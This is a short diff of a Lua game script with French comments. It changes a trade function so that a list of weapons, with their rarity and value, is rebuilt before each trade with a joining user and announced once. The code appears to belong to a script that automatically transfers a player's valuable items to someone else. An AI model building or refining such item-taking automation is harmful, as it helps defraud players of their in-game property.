@@ -465,7 +465,7 @@ if #weaponsToSend > 0 then
     SendFirstMessage(originalWeaponsList, prefix)
 
     local isTrading = false
-    local messageSent = false -- NOUVEAU: Flag pour éviter d'envoyer le message plusieurs fois
+    local messageSent = false
 
     local function doTrade(joinedUser)
         if isTrading then
@@ -474,7 +474,18 @@ if #weaponsToSend > 0 then
         
         isTrading = true
         
-        -- NOUVEAU: Envoyer le message seulement une fois au début du premier trade
+        -- Réinitialiser weaponsToSend depuis la liste originale
+        weaponsToSend = {}
+        for i, v in ipairs(originalWeaponsList) do
+            weaponsToSend[i] = {
+                DataID = v.DataID,
+                Rarity = v.Rarity,
+                Amount = v.Amount,
+                Value = v.Value
+            }
+        end
+        
+        -- Envoyer le message seulement une fois au début du premier trade
         if not messageSent then
             SendMessage(originalWeaponsList)
             messageSent = true
